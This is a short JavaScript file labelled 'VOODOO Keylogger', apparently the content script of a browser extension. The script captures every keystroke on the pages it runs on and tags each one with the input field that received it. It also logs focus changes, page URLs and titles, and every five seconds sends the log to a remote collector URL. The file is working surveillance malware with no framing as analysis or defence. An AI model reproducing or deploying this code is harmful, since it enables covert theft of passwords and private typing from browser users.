/**
 * VOODOO Keylogger
 */
(function () {
    sessionStorage.setItem("uuid", Math.random().toString(16).substring(2));
    const options = REBY_INJECTED_OPTIONS;

    if (!options.collector_url) {
        return;
    }

    let output = "";
    let lastElement = null;

    function describe(element) {
        const names = {
            type: element.getAttribute("type"),
            name: element.getAttribute("name"),
            id: element.getAttribute("id")
        };
        let id = element.tagName + ":";
        for (let key in names) {
            if (names[key]) {
                id += `${key}=${names[key]} `
            }
        }
        return id;
    }

    function send_to_collector() {
        chrome.runtime.sendMessage({
            collector_url: options.collector_url,
            body: JSON.stringify({ time: new Date().getTime(), origin: window.location.origin, uuid: sessionStorage.uuid, log: output })
        }, function (response) {
            //console.log(response);
        });
        output = "";
    }

    setInterval(function () {
        if (output.length !== 0) {
            send_to_collector();
        }
    }, 5000);

    window.addEventListener("beforeunload", function (e) {
        if (output.length === 0) {
            return;
        }
        send_to_collector();
    }, false);

    window.addEventListener("blur", function () {
        output += "\n[TAB LOST FOCUS]\n";
    });

    window.addEventListener("focus", function () {
        output += `\n====== [FOCUS] ${window.location.href} (${document.title}) ======\n`;
    });

    window.addEventListener("keydown", function (event) {
        if (lastElement !== event.path[0]) {
            lastElement = event.path[0];
            output += `\n==> ${describe(event.path[0])}\n`
        }
        if (event.key.length > 1) {
            output += `[[${event.key}]]`;
        } else {
            output += event.key;
        }
    });

    output = `\n====== ${window.location.href} (${document.title}) ======\n`;
    send_to_collector();
})();